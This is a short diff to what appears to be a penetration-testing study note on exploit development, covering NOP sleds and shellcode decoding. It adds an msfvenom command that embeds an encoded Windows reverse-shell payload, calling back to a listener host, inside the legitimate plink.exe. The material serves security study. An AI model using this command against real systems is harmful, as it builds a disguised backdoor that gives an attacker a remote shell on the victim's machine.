@@ -51,3 +51,7 @@ One method to avoid this issue is to adjust ESP backwards, making use of assembl
 This may sound complicated, but we simply precede our payload with a series of No Operation (or NOP) instructions, which have an opcode value of 0x90. As the name suggests, these instructions do nothing, and simply pass execution to the next instruction. 
 Used in this way, these instructions, also defined as a NOP sled or NOP slide, will let the CPU "slide" through the NOPs until the payload is reached.In both cases, by the time the execution reaches the shellcode decoder, the stack pointer points far enough away from it so as to not corrupt the shellcode when the GetPC routine overwrites a few bytes on the stack.
 ```
+### inject a payload into an existing PE file
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.2 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+```
